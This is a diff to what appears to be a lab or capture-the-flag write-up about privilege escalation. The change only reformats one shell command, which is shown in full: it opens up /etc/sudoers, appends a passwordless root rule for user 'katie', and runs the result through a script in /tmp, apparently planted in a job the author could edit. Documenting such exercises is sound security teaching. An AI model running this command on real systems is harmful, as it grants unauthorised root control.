@@ -70,8 +70,7 @@ To escalate my privileges I edited one of the jobs that I had access to (I chose
 this inside: </br>
 
 ```
-echo 'chmod 777 /etc/sudoers && echo "katie ALL=NOPASSWD: ALL" >> /etc/sudoers
-&& chmod 440 /etc/sudoers' > /tmp/test.sh && bash /tmp/test.sh
+echo 'chmod 777 /etc/sudoers && echo "katie ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/test.sh && bash /tmp/test.sh
 ``` 
 </br>
 
